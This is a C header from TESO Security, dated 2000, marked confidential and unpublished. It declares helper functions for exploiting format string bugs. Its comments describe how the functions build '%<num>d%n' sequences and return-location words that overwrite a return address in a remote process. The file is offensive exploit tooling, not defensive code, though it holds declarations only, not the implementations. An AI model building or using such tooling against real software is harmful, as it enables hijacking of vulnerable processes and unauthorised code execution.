/* helper functions for exploiting format bugs
 * coded by smiler / teso
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of TESO Security
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * TESO Security.
 *
 * (C) COPYRIGHT TESO Security, 2000
 * All Rights Reserved
 */

#ifndef TESO_FORMAT_H
#define TESO_FORMAT_H
#include <stdio.h>

typedef struct tf_opt {
	char	*pad_8;
	char	*pad_4;
	int	pad_8_write_cnt;
	int	pad_4_write_cnt;
} tf_opt;

extern tf_opt tf_efficient;
extern tf_opt tf_accurate;


/* function callback typedef to check if a character is valid
 * return 0 if invalid
 * return 1 if valid
 * note the is*() functions defined in <ctype.h> can be used in this context, but the logic is reversed.
 */

typedef int (*tf_valid_chr)(int);

/* insert a padding string into 'dst', to reach anywhere in particular
 *
 * the padding is specified by 'opts'
 *
 * increments write_cnt, by the nr written by the *printf() function
 *
 * if write_cnt ever exceeds max_write_cnt, an error is returned
 * max_write_cnt is ignored if equal to -1
 *
 * 'distance' must be word aligned
 *
 * return nr of bytes written to dst buffer on success
 * return -1 on error 
 */

int	tf_pad (char *dst, int distance, const tf_opt *opts, int *write_cnt, int max_write_cnt);

/* actually write the '%<num>d%n%<num>d%n...' string to overwrite the return address
 *
 * expects something like <4-byte-dummy><retlocl><4byte><retlocl+1><4byte><retloc+2><4byte><retloc+3>
 * at the current va_arg pointer (in the remote process) this must be ensured by the caller - the 
 * contents of the dummys are not important
 *
 * modifies write_cnt, if *write_cnt exceeds max_write_cnt and max_write_cnt != -1, then an error (0) is returned
 * else number of bytes written to dst is returned on success
 */

int	tf_ret (char *dst, unsigned int ret, int *write_cnt, int max_write_cnt);

 /* create retloc stuff
  * cheqr and/or dummy can be NULL pointers
  *
  * returns 0 if invalid characters are found
  * returns number of characters written on success
  */

int	tf_retloc (char *dst, unsigned int retloc, char * dummy, tf_valid_chr cheqr, int *write_cnt);

int	tf_cheq_word (char *word, tf_valid_chr cheqr);

#endif /* TESO_FORMAT_H */
